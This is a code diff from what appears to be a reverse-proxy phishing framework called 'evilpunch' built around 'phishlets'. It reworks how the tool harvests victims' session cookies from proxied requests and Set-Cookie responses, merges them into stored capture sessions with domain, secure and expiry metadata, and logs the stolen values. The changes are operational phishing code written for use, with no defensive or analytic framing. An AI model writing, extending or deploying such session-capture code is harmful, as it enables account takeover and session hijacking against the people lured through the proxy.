@@ -844,7 +844,7 @@ async def force_post_data(request, phishlet_id: int):
                     else:
                         debug_log(f"Unsupported encoding for force_post: {encoding}", "DEBUG")
                         return
-                    debug_log(f"Form data parsed for force_post: {form_data}", "DEBUG")
+                    # debug_log(f"Form data parsed for force_post: {form_data}", "DEBUG")
                 except Exception as e:
                     debug_log(f"Could not parse request body for force_post: {e}", "DEBUG")
                     return
@@ -1136,11 +1136,13 @@ def _parse_cookie_metadata(cookie_name: str, cookie_value: str, proxy_domain: st
     """
     Parse cookie metadata and create detailed cookie object
     """
+    debug_log(f"🔍 PARSING cookie metadata for '{cookie_name}' with proxy_domain: '{proxy_domain}'", "DEBUG")
+    
     # Create detailed cookie object with metadata
     cookie_info = {
         "name": cookie_name,
         "value": cookie_value,
-        "domain": proxy_domain,
+        "domain": proxy_domain,  # REQUEST COOKIE DOMAIN SET TO PROXY_DOMAIN
         "hostOnly": True,  # Default to true for proxy cookies
         "path": "/",  # Default path
         "secure": True,  # Default to secure for HTTPS
@@ -1152,6 +1154,8 @@ def _parse_cookie_metadata(cookie_name: str, cookie_value: str, proxy_domain: st
         "expirationDate": None,  # We can't determine expiration from request
         "storeId": None
     }
+    
+    debug_log(f"🔍 REQUEST cookie domain set to proxy_domain: '{proxy_domain}' for cookie '{cookie_name}'", "DEBUG")
     
     # Try to extract additional metadata from cookie name and value
     if "session" in cookie_name.lower():
@@ -1184,39 +1188,33 @@ async def capture_cookies(request, session_cookie: str, phishlet_id: int, proxy_
         cookies = request.cookies
         
         if cookies:
-            debug_log(f"🍪 Found {len(cookies)} total cookies in request", "DEBUG")
-            debug_log(f"🍪 Request cookies: {list(cookies.keys())}", "DEBUG")
-            
             # Filter out our own session cookie and capture detailed cookie info
             captured_cookies = []
-            filtered_cookies = []
-            
             for name, value in cookies.items():
                 if name != f'evilpunch_session_{phishlet_id}':
                     # Parse detailed cookie metadata
                     cookie_info = _parse_cookie_metadata(name, value, proxy_domain)
                     captured_cookies.append(cookie_info)
-                else:
-                    filtered_cookies.append(name)
-            
-            if filtered_cookies:
-                debug_log(f"🍪 Filtered out {len(filtered_cookies)} evilpunch session cookies: {filtered_cookies}", "DEBUG")
             
             if captured_cookies:
-                await merge_cookies_to_session(session_cookie, phishlet_id, proxy_domain, captured_cookies, "request")
-                debug_log(f"🎯 🟢 CAPTURED {len(captured_cookies)} COOKIES from request with detailed metadata", "INFO")
+                await update_session_data(
+                    session_cookie, 
+                    phishlet_id, 
+                    proxy_domain, 
+                    captured_cookies=captured_cookies
+                )
+                debug_log(f"🎯 🟢 CAPTURED {len(captured_cookies)} COOKIES with detailed metadata", "INFO")
                 for cookie in captured_cookies:
                     debug_log(f"   🍪 {cookie['name']}: {cookie['value'][:20]}... (domain: {cookie['domain']}, secure: {cookie['secure']})", "DEBUG")
-            else:
-                debug_log("⚠️  No request cookies captured (none found or all filtered out)", "DEBUG")
                 
     except Exception as e:
-        debug_log(f"Error capturing cookies from request: {e}", "ERROR")
+        debug_log(f"Error capturing cookies: {e}", "ERROR")
         debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
 
 async def merge_cookies_to_session(session_cookie: str, phishlet_id: int, proxy_domain: str, new_cookies: list, source: str):
     """
-    Merge new cookies with existing session cookies instead of replacing them
+    Merge new cookies with existing session cookies instead of replacing them.
+    Preserves full cookie metadata and handles both dict and list formats.
     """
     try:
         def _merge_operation():
@@ -1229,25 +1227,78 @@ async def merge_cookies_to_session(session_cookie: str, phishlet_id: int, proxy_
                     is_active=True
                 )
                 
-                # Get existing cookies or initialize empty dict
-                existing_cookies = session.captured_cookies or {}
+                # Get existing cookies - handle both dict and list formats
+                existing_cookies = session.captured_cookies or []
                 
-                # Convert list of cookie objects to dict for merging
-                new_cookies_dict = {}
-                for cookie in new_cookies:
-                    new_cookies_dict[cookie['name']] = cookie
+                # Ensure existing_cookies is a list
+                if isinstance(existing_cookies, dict):
+                    # Convert old dict format to list format
+                    existing_cookies = list(existing_cookies.values())
+                elif not isinstance(existing_cookies, list):
+                    existing_cookies = []
                 
-                # Merge new cookies with existing ones (new cookies override existing ones with same name)
-                merged_cookies = {**existing_cookies, **new_cookies_dict}
+                # Create a lookup dict for existing cookies by name
+                existing_by_name = {}
+                for cookie in existing_cookies:
+                    if isinstance(cookie, dict) and 'name' in cookie:
+                        existing_by_name[cookie['name']] = cookie
+                
+                # Merge new cookies with existing ones
+                merged_cookies = existing_cookies.copy()
+                added_count = 0
+                updated_count = 0
+                
+                for new_cookie in new_cookies:
+                    if not isinstance(new_cookie, dict) or 'name' not in new_cookie:
+                        continue
+                    
+                    cookie_name = new_cookie['name']
+                    new_cookie_domain = new_cookie.get('domain', 'N/A')
+                    
+                    debug_log(f"🔍 MERGING cookie '{cookie_name}' with domain '{new_cookie_domain}' from {source}", "DEBUG")
+                    
+                    if cookie_name in existing_by_name:
+                        # Update existing cookie with new data
+                        existing_cookie = existing_by_name[cookie_name]
+                        existing_domain = existing_cookie.get('domain', 'N/A')
+                        
+                        debug_log(f"🔍 EXISTING cookie '{cookie_name}' has domain '{existing_domain}'", "DEBUG")
+                        debug_log(f"🔍 NEW cookie '{cookie_name}' has domain '{new_cookie_domain}'", "DEBUG")
+                        
+                        # Merge metadata, preferring new values
+                        merged_cookie = {**existing_cookie, **new_cookie}
+                        merged_domain = merged_cookie.get('domain', 'N/A')
+                        
+                        debug_log(f"🔍 MERGED cookie '{cookie_name}' final domain: '{merged_domain}'", "DEBUG")
+                        
+                        # Find and replace in the list
+                        for i, cookie in enumerate(merged_cookies):
+                            if isinstance(cookie, dict) and cookie.get('name') == cookie_name:
+                                merged_cookies[i] = merged_cookie
+                                break
+                        
+                        existing_by_name[cookie_name] = merged_cookie
+                        updated_count += 1
+                        debug_log(f"🍪 UPDATED cookie '{cookie_name}' from {source} (domain: '{existing_domain}' -> '{merged_domain}')", "DEBUG")
+                    else:
+                        # Add new cookie
+                        merged_cookies.append(new_cookie)
+                        existing_by_name[cookie_name] = new_cookie
+                        added_count += 1
+                        debug_log(f"🍪 ADDED new cookie '{cookie_name}' from {source} (domain: '{new_cookie_domain}')", "DEBUG")
                 
                 # Update the session with merged cookies
                 session.captured_cookies = merged_cookies
                 session.is_captured = session.has_captured_data()
                 session.save(update_fields=['captured_cookies', 'is_captured'])
                 
-                added_count = len(new_cookies_dict)
                 total_count = len(merged_cookies)
-                debug_log(f"🍪 MERGED {added_count} new cookies from {source} into session (total: {total_count})", "DEBUG")
+                debug_log(f"🍪 MERGED {added_count} new + {updated_count} updated cookies from {source} into session (total: {total_count})", "DEBUG")
+                
+                # Log cookie details for debugging
+                for cookie in merged_cookies:
+                    if isinstance(cookie, dict) and 'name' in cookie:
+                        debug_log(f"   🍪 {cookie['name']}: {cookie.get('value', '')[:20]}... (domain: {cookie.get('domain', 'N/A')}, secure: {cookie.get('secure', False)})", "DEBUG")
                 
             except Session.DoesNotExist:
                 debug_log(f"Session {session_cookie[:8]}... not found for cookie merge", "WARN")
@@ -1262,22 +1313,42 @@ async def merge_cookies_to_session(session_cookie: str, phishlet_id: int, proxy_
 
 async def capture_response_cookies(response_headers, session_cookie: str, phishlet_id: int, proxy_domain: str):
     """
-    Capture cookies from response Set-Cookie headers and update session with detailed metadata
+    Capture cookies from response Set-Cookie headers and update session with detailed metadata.
     """
     try:
         # Check for Set-Cookie headers in response
         set_cookie_headers = response_headers.getall('Set-Cookie', [])
         
         if set_cookie_headers:
+            # Get phishlet data
+            def _get_phishlet_data():
+                from .models import Phishlet
+                try:
+                    phishlet = Phishlet.objects.get(id=phishlet_id)
+                    return phishlet.data if phishlet.data else {}
+                except Phishlet.DoesNotExist:
+                    return {}
+            
+            loop = asyncio.get_running_loop()
+            phishlet_data = await loop.run_in_executor(None, _get_phishlet_data)
+            
             captured_cookies = []
             for set_cookie_header in set_cookie_headers:
                 try:
+                    debug_log(f"🔍 PROCESSING response Set-Cookie header: '{set_cookie_header}'", "DEBUG")
+                    
                     # Parse Set-Cookie header to extract detailed cookie metadata
                     cookie_info = _parse_set_cookie_header(set_cookie_header, proxy_domain)
                     
+                    debug_log(f"🔍 Parsed cookie_info domain: '{cookie_info['domain']}' for cookie '{cookie_info['name']}'", "DEBUG")
+                    
                     # Filter out our own session cookie
                     if cookie_info['name'] != f'evilpunch_session_{phishlet_id}':
+                        debug_log(f"🔍 Adding cookie '{cookie_info['name']}' with domain '{cookie_info['domain']}'", "DEBUG")
+                        
                         captured_cookies.append(cookie_info)
+                    else:
+                        debug_log(f"🔍 Filtered out evilpunch session cookie: '{cookie_info['name']}'", "DEBUG")
                         
                 except Exception as cookie_error:
                     debug_log(f"Error parsing Set-Cookie header '{set_cookie_header}': {cookie_error}", "WARN")
@@ -1301,6 +1372,8 @@ def _parse_set_cookie_header(set_cookie_header: str, proxy_domain: str) -> dict:
     Example: "sessionId=abc123; Domain=.example.com; Path=/; Secure; HttpOnly; SameSite=Strict"
     """
     try:
+        debug_log(f"🔍 PARSING Set-Cookie header: '{set_cookie_header}' with proxy_domain: '{proxy_domain}'", "DEBUG")
+        
         # Split the header into parts
         parts = set_cookie_header.split(';')
         cookie_part = parts[0].strip()
@@ -1311,11 +1384,13 @@ def _parse_set_cookie_header(set_cookie_header: str, proxy_domain: str) -> dict:
         else:
             name, value = cookie_part, ""
         
+        debug_log(f"🔍 Extracted cookie name: '{name.strip()}', value: '{value.strip()}'", "DEBUG")
+        
         # Initialize cookie info
         cookie_info = {
             "name": name.strip(),
             "value": value.strip(),
-            "domain": proxy_domain,
+            "domain": proxy_domain,  # INITIAL DOMAIN SET TO PROXY_DOMAIN
             "hostOnly": True,
             "path": "/",
             "secure": False,
@@ -1328,6 +1403,8 @@ def _parse_set_cookie_header(set_cookie_header: str, proxy_domain: str) -> dict:
             "storeId": None
         }
         
+        debug_log(f"🔍 INITIAL cookie domain set to proxy_domain: '{proxy_domain}'", "DEBUG")
+        
         # Parse attributes
         for part in parts[1:]:
             part = part.strip()
@@ -1336,13 +1413,21 @@ def _parse_set_cookie_header(set_cookie_header: str, proxy_domain: str) -> dict:
                 attr_name = attr_name.strip().lower()
                 attr_value = attr_value.strip()
                 
+                debug_log(f"🔍 Processing attribute: '{attr_name}' = '{attr_value}'", "DEBUG")
+                
                 if attr_name == 'domain':
+                    old_domain = cookie_info['domain']
                     cookie_info['domain'] = attr_value
                     cookie_info['hostOnly'] = False
+                    debug_log(f"🔍 DOMAIN ATTRIBUTE FOUND! Changed domain from '{old_domain}' to '{attr_value}'", "DEBUG")
                 elif attr_name == 'path':
                     cookie_info['path'] = attr_value
                 elif attr_name == 'samesite':
-                    cookie_info['sameSite'] = attr_value.lower()
+                    # if attr_value is none, set it to None (not the string "none")
+                    if attr_value is None:
+                        cookie_info['sameSite'] = None
+                    else:
+                        cookie_info['sameSite'] = attr_value.lower()
                 elif attr_name == 'expires':
                     # Try to parse expiration date
                     try:
@@ -1368,6 +1453,8 @@ def _parse_set_cookie_header(set_cookie_header: str, proxy_domain: str) -> dict:
                     cookie_info['httpOnly'] = True
                 elif attr_name == 'session':
                     cookie_info['session'] = True
+        
+        debug_log(f"🔍 FINAL parsed cookie domain: '{cookie_info['domain']}' for cookie '{cookie_info['name']}'", "DEBUG")
         
         # Apply intelligent defaults based on cookie name
         if "session" in cookie_info['name'].lower():
@@ -2420,8 +2507,8 @@ async def proxy_handler(request):
                         )
                         return response
                     
-                    # Capture cookies from the request
-                    await capture_cookies(request, session_cookie, matching_phishlet['id'], matching_phishlet['proxy_domain'])
+                    # # Capture cookies from the request
+                    # await capture_cookies(request, session_cookie, matching_phishlet['id'], matching_phishlet['proxy_domain'])
                     
                     # Apply GET/POST force rules as configured
                     await force_get_data(request, matching_phishlet['id'])
